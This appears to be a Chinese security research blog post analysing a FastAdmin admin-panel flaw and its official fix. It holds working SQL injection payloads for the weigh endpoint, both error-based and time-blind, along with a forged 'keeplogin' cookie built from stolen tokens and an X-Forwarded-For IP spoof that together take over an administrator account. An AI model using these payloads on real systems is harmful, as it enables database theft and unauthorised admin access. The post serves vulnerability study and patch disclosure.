@@ -1,0 +1,256 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="000eb9f9e1892fe22ee7af2cffe6f2b8">0x01 前言</h2>
+<p>前段时间续师傅又给我指出了fastadmin 后台低权限拿 shell 的漏洞点：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181220-16b959d2-062a-1.png"/></p>
+<p>在忙好自己的事情后，有了这次的分析</p>
+<p>影响版本：<strong>V1.0.0.20191212_beta</strong> 及以下版本</p>
+<h2 data-content="1" id="c180472bd24c5fe004fba26a6e9d37f6">0x02 fastadmin 的鉴权流程</h2>
+<p>低权限后台拿 shell 遇到的最大的问题就是有些功能存在 getshell 的点，但是低权限没有权限去访问。因此我们有以下几个思路：</p>
+<ul>
+<li>在低权限的情况下，找到某些功能存在 getshell 的点</li>
+<li>把低权限提升到高权限，再利用高权限可访问的功能点去 getshell</li>
+<li>绕过权限的限制，找到 getshell 的点</li>
+</ul>
+<p>本文利用的就是第一种和第二种相结合的情况，在低权限的情况下，找到可利用的某些方法，利用这种方法本身存在的漏洞去获取高权限，然后利用高权限可访问的功能点去 getshell。</p>
+<p>既然强调了权限，因此必须要介绍一下fastadmin 的鉴权流程，只有清楚在什么情况下，有权限访问，什么情况下无权限访问，才可以找到系统中可能存在的漏洞点。</p>
+<p>在 fastadmin 中的<code>/application/common/controller/Backend.php</code>文件中，详细说明了鉴权的一些信息。关键信息如下：</p>
+<div class="highlight"><pre><span></span><span class="x">protected $noNeedLogin = [];    </span>
+<span class="x"> protected $noNeedRight = [];    </span>
+
+<span class="x">...</span>
+
+<span class="x">   public function _initialize()</span>
+<span class="x">    {</span>
+<span class="x">        $modulename = $this-&gt;request-&gt;module();</span>
+<span class="x">        $controllername = Loader::parseName($this-&gt;request-&gt;controller());</span>
+<span class="x">        $actionname = strtolower($this-&gt;request-&gt;action());</span>
+<span class="x">        $path = str_replace('.', '/', $controllername) . '/' . $actionname;</span>
+<span class="x">        !defined('IS_ADDTABS') &amp;&amp; define('IS_ADDTABS', input("addtabs") ? true : false);</span>
+<span class="x">        !defined('IS_DIALOG') &amp;&amp; define('IS_DIALOG', input("dialog") ? true : false);</span>
+<span class="x">        !defined('IS_AJAX') &amp;&amp; define('IS_AJAX', $this-&gt;request-&gt;isAjax());</span>
+<span class="x">        $this-&gt;auth = Auth::instance();</span>
+<span class="x">        // 设置当前请求的URI</span>
+<span class="x">        $this-&gt;auth-&gt;setRequestUri($path);</span>
+<span class="x">        // 检测是否需要验证登录</span>
+<span class="x">        if (!$this-&gt;auth-&gt;match($this-&gt;noNeedLogin)) {</span>
+<span class="x">            //检测是否登录</span>
+<span class="x">            if (!$this-&gt;auth-&gt;isLogin()) {</span>
+<span class="x">                Hook::listen('admin_nologin', $this);</span>
+<span class="x">                $url = Session::get('referer');</span>
+<span class="x">                $url = $url ? $url : $this-&gt;request-&gt;url();</span>
+<span class="x">                if ($url == '/') {</span>
+<span class="x">                    $this-&gt;redirect('index/login', [], 302, ['referer' =&gt; $url]);</span>
+<span class="x">                    exit;</span>
+<span class="x">                }</span>
+<span class="x">                $this-&gt;error(__('Please login first'), url('index/login', ['url' =&gt; $url]));</span>
+<span class="x">            }</span>
+<span class="x">            // 判断是否需要验证权限</span>
+<span class="x">            if (!$this-&gt;auth-&gt;match($this-&gt;noNeedRight)) {</span>
+<span class="x">                // 判断控制器和方法判断是否有对应权限</span>
+<span class="x">                if (!$this-&gt;auth-&gt;check($path)) {</span>
+<span class="x">                    Hook::listen('admin_nopermission', $this);</span>
+<span class="x">                    $this-&gt;error(__('You have no permission'), '');</span>
+<span class="x">                }</span>
+<span class="x">            }</span>
+<span class="x">        }</span>
+</pre></div>
+<p>fastamdin 规定了两个集合，一个集合为无需登录，无需鉴权，即可访问的<code>$noNeedLogin</code>，一个集合为需要登录，无需鉴权，即可访问的<code>$noNeedRight</code>，然后定义了初始化函数<code>_initialize()</code>，该方法主要用于验证访问当前 URL的用户是否登录，访问的方法是否需要登录以及访问的方法是否需要检验权限。</p>
+<p>这个鉴权文件被各个控制器所引用，并且这些控制器在开始处都会规定哪些方法属于<code>$noNeedLogin</code>，哪些方法属于<code>$noNeedRight</code>，如在<code>/application/admin/index.php</code>文件中的开头处：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181238-21a2c11c-062a-1.png"/></p>
+<p>规定了<code>login</code>方法为无需登录，无需鉴权的方法，<code>index</code>和<code>logout</code>为需要登录，无需鉴权的方法。然后重写<code>_initialize()</code>，并且在该方法中引入了<code>Backend.php</code>中的<code>_initialize()</code>判断方法。</p>
+<p>以上为 fastadmin 的简单的鉴权流程，更复杂的鉴权，如需要登录并且需要鉴权等，有兴趣的朋友可自行阅读源代码去研究。</p>
+<h2 data-content="1" id="1122c712192c03e28bcd7c3b131be571">0x03 漏洞分析</h2>
+<p>漏洞点：<code>/application/admin/controller/Ajax.php</code></p>
+<p>在该文件的开头处，定义了各类方法的权限，如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181250-2884d204-062a-1.png"/></p>
+<p>规定<code>lang</code>方法无需登录、无需鉴权即可访问，其他方法（upload、weigh、wipecache、category、area、icon）为需要登录、无需鉴权即可访问的方法。其中，<code>weigh</code>方法的主要内容如下：</p>
+<div class="highlight"><pre><span></span><span class="x">public function weigh()</span>
+<span class="x">    {</span>
+<span class="x">        //排序的数组</span>
+<span class="x">        $ids = $this-&gt;request-&gt;post("ids");</span>
+<span class="x">        //拖动的记录ID</span>
+<span class="x">        $changeid = $this-&gt;request-&gt;post("changeid");</span>
+<span class="x">        //操作字段</span>
+<span class="x">        $field = $this-&gt;request-&gt;post("field");</span>
+<span class="x">        //操作的数据表</span>
+<span class="x">        $table = $this-&gt;request-&gt;post("table");</span>
+<span class="x">        //主键</span>
+<span class="x">        $pk = $this-&gt;request-&gt;post("pk");</span>
+<span class="x">        //排序的方式</span>
+<span class="x">        $orderway = strtolower($this-&gt;request-&gt;post("orderway", ""));</span>
+<span class="x">        $orderway = $orderway == 'asc' ? 'ASC' : 'DESC';</span>
+<span class="x">        $sour = $weighdata = [];</span>
+<span class="x">        $ids = explode(',', $ids);</span>
+<span class="x">        $prikey = $pk ? $pk : (Db::name($table)-&gt;getPk() ?: 'id');</span>
+<span class="x">        $pid = $this-&gt;request-&gt;post("pid");</span>
+<span class="x">        //限制更新的字段</span>
+<span class="x">        $field = in_array($field, ['weigh']) ? $field : 'weigh';</span>
+
+<span class="x">        // 如果设定了pid的值,此时只匹配满足条件的ID,其它忽略</span>
+<span class="x">        if ($pid !== '') {</span>
+<span class="x">            $hasids = [];</span>
+<span class="x">            $list = Db::name($table)-&gt;where($prikey, 'in', $ids)-&gt;where('pid', 'in', $pid)-&gt;field("{$prikey},pid")-&gt;select();</span>
+<span class="x">            foreach ($list as $k =&gt; $v) {</span>
+<span class="x">                $hasids[] = $v[$prikey];</span>
+<span class="x">            }</span>
+<span class="x">            $ids = array_values(array_intersect($ids, $hasids));</span>
+<span class="x">        }</span>
+
+<span class="x">        $list = Db::name($table)-&gt;field("$prikey,$field")-&gt;where($prikey, 'in', $ids)-&gt;order($field, $orderway)-&gt;select();</span>
+<span class="x">        foreach ($list as $k =&gt; $v) {</span>
+<span class="x">            $sour[] = $v[$prikey];</span>
+<span class="x">            $weighdata[$v[$prikey]] = $v[$field];</span>
+<span class="x">        }</span>
+<span class="x">        $position = array_search($changeid, $ids);</span>
+<span class="x">        $desc_id = $sour[$position];    //移动到目标的ID值,取出所处改变前位置的值</span>
+<span class="x">        $sour_id = $changeid;</span>
+<span class="x">        $weighids = array();</span>
+<span class="x">        $temp = array_values(array_diff_assoc($ids, $sour));</span>
+<span class="x">        foreach ($temp as $m =&gt; $n) {</span>
+<span class="x">            if ($n == $sour_id) {</span>
+<span class="x">                $offset = $desc_id;</span>
+<span class="x">            } else {</span>
+<span class="x">                if ($sour_id == $temp[0]) {</span>
+<span class="x">                    $offset = isset($temp[$m + 1]) ? $temp[$m + 1] : $sour_id;</span>
+<span class="x">                } else {</span>
+<span class="x">                    $offset = isset($temp[$m - 1]) ? $temp[$m - 1] : $sour_id;</span>
+<span class="x">                }</span>
+<span class="x">            }</span>
+<span class="x">            $weighids[$n] = $weighdata[$offset];</span>
+<span class="x">            Db::name($table)-&gt;where($prikey, $n)-&gt;update([$field =&gt; $weighdata[$offset]]);</span>
+<span class="x">        }</span>
+<span class="x">        $this-&gt;success();</span>
+<span class="x">    }</span>
+</pre></div>
+<p>在本方法中，<code>weigh</code>方法通过 POST 传值的方式，获取到了<code>ids</code>、<code>changeid</code>、<code>field</code>、<code>table</code>、<code>pk</code>、<code>orderway</code>参数的值，可以看到，这些值全部没有经过过滤，然后直接传入了 SQL 执行语句<code>Db::name($table)-&gt;field("$prikey,$field")-&gt;where($prikey, 'in', $ids)-&gt;order($field, $orderway)-&gt;select();</code>中。</p>
+<p>在这段后加上打印 SQL 语句：<code>echo Db::name($table)-&gt;getLastSql();</code>，如下图所示：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181303-305c0bd2-062a-1.png"/></p>
+<p>可以看到其 SQL 语句 如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181311-35388cfc-062a-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">`</span><span class="k">type</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">pid</span><span class="o">`</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">fa_category</span><span class="o">`</span> <span class="k">WHERE</span> <span class="o">`</span><span class="k">type</span><span class="o">`</span> <span class="k">IN</span> <span class="p">(</span><span class="s1">'2'</span><span class="p">,</span><span class="s1">'4'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">,</span><span class="s1">'3'</span><span class="p">,</span><span class="s1">'5'</span><span class="p">,</span><span class="s1">'6'</span><span class="p">,</span><span class="s1">'8'</span><span class="p">,</span><span class="s1">'9'</span><span class="p">,</span><span class="s1">'7'</span><span class="p">,</span><span class="s1">'10'</span><span class="p">,</span><span class="s1">'11'</span><span class="p">,</span><span class="s1">'12'</span><span class="p">,</span><span class="s1">'13'</span><span class="p">)</span> <span class="k">AND</span> <span class="o">`</span><span class="n">pid</span><span class="o">`</span> <span class="k">IN</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</pre></div>
+<p>这样就很清楚了，我们可以修改<code>table</code>值，来执行我们所需要的 SQL 语句，如下：</p>
+<div class="highlight"><pre><span></span><span class="n">ids</span><span class="o">=</span><span class="mi">2</span><span class="o">%</span><span class="mi">2</span><span class="n">C4</span><span class="o">%</span><span class="mi">2</span><span class="n">C1</span><span class="o">%</span><span class="mi">2</span><span class="n">C3</span><span class="o">%</span><span class="mi">2</span><span class="n">C5</span><span class="o">%</span><span class="mi">2</span><span class="n">C6</span><span class="o">%</span><span class="mi">2</span><span class="n">C8</span><span class="o">%</span><span class="mi">2</span><span class="n">C9</span><span class="o">%</span><span class="mi">2</span><span class="n">C7</span><span class="o">%</span><span class="mi">2</span><span class="n">C10</span><span class="o">%</span><span class="mi">2</span><span class="n">C11</span><span class="o">%</span><span class="mi">2</span><span class="n">C12</span><span class="o">%</span><span class="mi">2</span><span class="n">C13</span><span class="o">&amp;</span><span class="n">changeid</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">pid</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">field</span><span class="o">=</span><span class="n">weigh</span><span class="o">&amp;</span><span class="n">orderway</span><span class="o">=</span><span class="k">desc</span><span class="o">&amp;</span><span class="n">pk</span><span class="o">=</span><span class="k">type</span><span class="o">&amp;</span><span class="k">table</span><span class="o">=</span><span class="n">category</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181322-3bc45dbc-062a-1.png"/></p>
+<p>成功爆出 <code>user()</code>，但需要注意的是，由于是本地调试，我开启了 fastadmin 的应用调试模式，如果将其关闭：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181334-4293d5a0-062a-1.png"/></p>
+<p>那么就不会返回错误信息，也自然不会返回我们所需要的信息：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181344-48cf4792-062a-1.png"/></p>
+<p>因此我需要修改 SQL 语句，将报错模式改为时间盲注模式：</p>
+<div class="highlight"><pre><span></span><span class="n">ids</span><span class="o">=</span><span class="mi">2</span><span class="o">%</span><span class="mi">2</span><span class="n">C4</span><span class="o">%</span><span class="mi">2</span><span class="n">C1</span><span class="o">%</span><span class="mi">2</span><span class="n">C3</span><span class="o">%</span><span class="mi">2</span><span class="n">C5</span><span class="o">%</span><span class="mi">2</span><span class="n">C6</span><span class="o">%</span><span class="mi">2</span><span class="n">C8</span><span class="o">%</span><span class="mi">2</span><span class="n">C9</span><span class="o">%</span><span class="mi">2</span><span class="n">C7</span><span class="o">%</span><span class="mi">2</span><span class="n">C10</span><span class="o">%</span><span class="mi">2</span><span class="n">C11</span><span class="o">%</span><span class="mi">2</span><span class="n">C12</span><span class="o">%</span><span class="mi">2</span><span class="n">C13</span><span class="o">&amp;</span><span class="n">changeid</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">pid</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">field</span><span class="o">=</span><span class="n">weigh</span><span class="o">&amp;</span><span class="n">orderway</span><span class="o">=</span><span class="k">desc</span><span class="o">&amp;</span><span class="n">pk</span><span class="o">=</span><span class="k">type</span><span class="o">&amp;</span><span class="k">table</span><span class="o">=</span><span class="n">category</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">95</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
+</pre></div>
+<p>发现出错</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181358-5116a526-062a-1.png"/></p>
+<p>DeBug 调试发现<code>&gt;</code>符号被转义成实体了：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181408-56fe7d4c-062a-1.png"/></p>
+<p>没事，将语句改为：</p>
+<div class="highlight"><pre><span></span><span class="n">ids</span><span class="o">=</span><span class="mi">2</span><span class="o">%</span><span class="mi">2</span><span class="n">C4</span><span class="o">%</span><span class="mi">2</span><span class="n">C1</span><span class="o">%</span><span class="mi">2</span><span class="n">C3</span><span class="o">%</span><span class="mi">2</span><span class="n">C5</span><span class="o">%</span><span class="mi">2</span><span class="n">C6</span><span class="o">%</span><span class="mi">2</span><span class="n">C8</span><span class="o">%</span><span class="mi">2</span><span class="n">C9</span><span class="o">%</span><span class="mi">2</span><span class="n">C7</span><span class="o">%</span><span class="mi">2</span><span class="n">C10</span><span class="o">%</span><span class="mi">2</span><span class="n">C11</span><span class="o">%</span><span class="mi">2</span><span class="n">C12</span><span class="o">%</span><span class="mi">2</span><span class="n">C13</span><span class="o">&amp;</span><span class="n">changeid</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">pid</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">field</span><span class="o">=</span><span class="n">weigh</span><span class="o">&amp;</span><span class="n">orderway</span><span class="o">=</span><span class="k">desc</span><span class="o">&amp;</span><span class="n">pk</span><span class="o">=</span><span class="k">type</span><span class="o">&amp;</span><span class="k">table</span><span class="o">=</span><span class="n">category</span><span class="o">+</span><span class="k">where</span><span class="o">+</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="k">and</span><span class="o">+</span><span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span> <span class="k">in</span> <span class="p">(</span><span class="mi">0</span><span class="n">x66</span><span class="p">),</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181420-5e13f3aa-062a-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181430-644d013a-062a-1.png"/></p>
+<p>成功注入</p>
+<p>同理，利用时间盲注，可以注入出用户名和密码，具体语句可以自行查找相关的实际盲注语句，这里不再赘述</p>
+<p>但是，我们知道当管理员密码复杂的时候，MD5 不一定能够破解，况且 fastadmin 密码是加盐的：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181442-6b1ee38e-062a-1.png"/></p>
+<p>那么这个注入岂不是很鸡肋？</p>
+<p>当然不是！在<code>/application/admin/controller/Index.php</code>文件的大约100行，有以下代码：</p>
+<div class="highlight"><pre><span></span><span class="x">// 根据客户端的cookie,判断是否可以自动登录</span>
+<span class="x">        if ($this-&gt;auth-&gt;autologin()) {</span>
+<span class="x">            $this-&gt;redirect($url);</span>
+<span class="x">        }</span>
+</pre></div>
+<p>跟进<code>autologin()</code></p>
+<div class="highlight"><pre><span></span><span class="x">public function autologin()</span>
+<span class="x">    {</span>
+<span class="x">        $keeplogin = Cookie::get('keeplogin');</span>
+<span class="x">        if (!$keeplogin) {</span>
+<span class="x">            return false;</span>
+<span class="x">        }</span>
+<span class="x">        list($id, $keeptime, $expiretime, $key) = explode('|', $keeplogin);</span>
+<span class="x">        if ($id &amp;&amp; $keeptime &amp;&amp; $expiretime &amp;&amp; $key &amp;&amp; $expiretime &gt; time()) {</span>
+<span class="x">            $admin = Admin::get($id);</span>
+<span class="x">            if (!$admin || !$admin-&gt;token) {</span>
+<span class="x">                return false;</span>
+<span class="x">            }</span>
+<span class="x">            //token有变更</span>
+<span class="x">            if ($key != md5(md5($id) . md5($keeptime) . md5($expiretime) . $admin-&gt;token)) {</span>
+<span class="x">                return false;</span>
+<span class="x">            }</span>
+<span class="x">            $ip = request()-&gt;ip();</span>
+<span class="x">            //IP有变动</span>
+<span class="x">            if ($admin-&gt;loginip != $ip) {</span>
+<span class="x">                return false;</span>
+<span class="x">            }</span>
+<span class="x">            Session::set("admin", $admin-&gt;toArray());</span>
+<span class="x">            //刷新自动登录的时效</span>
+<span class="x">            $this-&gt;keeplogin($keeptime);</span>
+<span class="x">            return true;</span>
+<span class="x">        } else {</span>
+<span class="x">            return false;</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+</pre></div>
+<p>从<code>keeplogin</code>中获取信息，然后分割，将其分别赋值给<code>$id</code>,<code>$keeptime</code>,<code>$expiretime</code>,<code>$key</code>变量，若这些值大于当前时间并且满足以下条件：</p>
+<ul>
+<li>该<code>id</code>是否为管理员</li>
+<li>这个 <code>id</code> 的 token 在数据库中是否为空</li>
+<li>token 是否有变更</li>
+<li>IP 是否有变动</li>
+</ul>
+<p>满足以上条件，那么就可以自动登陆。那么该如何满足呢？</p>
+<p>从上面的注入漏洞我们可以从<code>fa_admin</code>表中的所有信息，<code>fa_admin</code>表字段信息如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181459-753f068c-062a-1.png"/></p>
+<p>因此可以根据存在的 id 值、token 值、IP 值来满足所需要的条件。</p>
+<p>对于 id 和 token 我们可以直接根据注入获得的信息来满足条件，对于 ip 的获取，我们可以使用 <code>X-Forwarded-For</code>来伪造 IP</p>
+<p>所以只要满足最后一个条件——token 是否有变更，即可自动登陆</p>
+<p>从上面代码中可以看出，<code>id</code>、<code>keeptime</code>、<code>expiretime</code>变量都是我们可控的，<code>token</code>可以通过注入获得，那么就很简单了，我们自己来构造一个符合<code>$key != md5(md5($id) . md5($keeptime) . md5($expiretime) . $admin-&gt;token</code>值的<code>key</code>，然后构造<code>keeplogin</code>值来进行自动登陆。</p>
+<p>我们可以赋值如下：</p>
+<pre><code>id--&gt;1--&gt;c4ca4238a0b923820dcc509a6f75849b
+
+keeptime--&gt;86400--&gt;641bed6f12f5f0033edd3827deec6759
+
+expiretime--&gt;1601902475--&gt;02dbcd10c7f55b1c592350154b5e87de
+
+token--&gt;43e78cd9-b16b-4f27-9648-d60fd0e9b464
+
+key--&gt;c4ca4238a0b923820dcc509a6f75849b641bed6f12f5f0033edd3827deec675902dbcd10c7f55b1c592350154b5e87de43e78cd9-b16b-4f27-9648-d60fd0e9b464--&gt;1fe1e4fc538e66089c4e24ed3b8e4c8c
+
+keeplogin--&gt;1|86400|1601902475|1fe1e4fc538e66089c4e24ed3b8e4c8c</code></pre>
+<p>这里要注意的是我们赋值的 <code>expiretime</code>变量要符合条件<code>$id &amp;&amp; $keeptime &amp;&amp; $expiretime &amp;&amp; $key &amp;&amp; $expiretime &gt; time()</code>才可，具体可以自己使用以下代码测试：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+    <span class="nv">$keeplogin</span> <span class="o">=</span> <span class="s1">'1|86400|1601902475|1fe1e4fc538e66089c4e24ed3b8e4c8c'</span><span class="p">;</span>
+    <span class="k">list</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span> <span class="nv">$keeptime</span><span class="p">,</span> <span class="nv">$expiretime</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$keeplogin</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$id</span> <span class="o">&amp;&amp;</span> <span class="nv">$keeptime</span> <span class="o">&amp;&amp;</span> <span class="nv">$expiretime</span> <span class="o">&amp;&amp;</span> <span class="nv">$key</span> <span class="o">&amp;&amp;</span> <span class="nv">$expiretime</span> <span class="o">&gt;</span> <span class="nb">time</span><span class="p">())</span> <span class="p">{</span>
+     <span class="k">echo</span> <span class="nb">time</span><span class="p">();</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+     <span class="k">echo</span> <span class="s1">'No'</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>构造好<code>keeplogin</code>后，我们可以来测试一下，首先看一下系统自动生成的 <code>keeplogin</code>为：</p>
+<pre><code>1%7C86400%7C1601886601%7Cab804a9bbb40d920704bc6e1b18a2733</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181515-7f059384-062a-1.png"/></p>
+<p>然后打开无痕窗口填入我们自己生成的<code>keeplogin</code>：</p>
+<pre><code>1|86400|1601902475|1fe1e4fc538e66089c4e24ed3b8e4c8c</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181526-856d5914-062a-1.png"/></p>
+<p>刷新后，发现自动登陆了<code>id</code>为 1 的 admin 账号：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181535-8ae73856-062a-1.png"/></p>
+<p>剩下的拿 shell 方式就和网上流传的一样了，其实如果权限够，也可以尝试注入直接拿 shell。</p>
+<h2 data-content="1" id="28ba59faa4ed9b75302cc45d16300bbf">0x04 漏洞修复</h2>
+<p>在<strong>V1.0.0.20191212_beta</strong>后，官方对于<code>$table</code>变量进行了修复：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181545-90bd0364-062a-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="x">$table = $this-&gt;request-&gt;post("table");</span>
+<span class="x">       if (!Validate::is($table, "alphaDash")) {</span>
+<span class="x">            $this-&gt;error();</span>
+<span class="x">        }</span>
+</pre></div>
+<p>对<code>$table</code>变量做了判断，验证其值是否为字母、数字、下划线_、破折号-</p>
+<p>这样使注入语句不能出现<code>逗号,</code>、<code>括号</code>等字符，对于注入的语句做了极大的限制</p>
+<h2 data-content="1" id="3dc3f02ed677d8db0262884652e565f2">0x05 总结</h2>
+<p>本文主要对于低权限如何提升至高权限的方法进行了分析，虽然不是最新版的，但是思路可以记录学习一波。值得一提的是，在<strong>V1.0.0.20200228_beta</strong>~<strong>V1.0.0.20200920_beta</strong>版本中，对于<code>pk</code>变量未进行修复，但是在<strong>V1.2.0.20201001_beta</strong>版本中，却对其进行了修复：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201004181559-997cabee-062a-1.png"/></p>
+<p>此外，SQL 执行语句<code>Db::name($table)-&gt;field("$prikey,$field")-&gt;where($prikey, 'in', $ids)-&gt;order($field, $orderway)-&gt;select();</code>中传入了<code>table</code>、<code>prikey(pk)</code>、<code>field</code>、<code>ids</code>、<code>orderway</code>变量，其中对于<code>table</code>以及<code>prikey(pk)</code>进行了过滤，其他变量却是没有的，so~有兴趣的朋友可以自己测试看看</p>
+</div>
+</div>
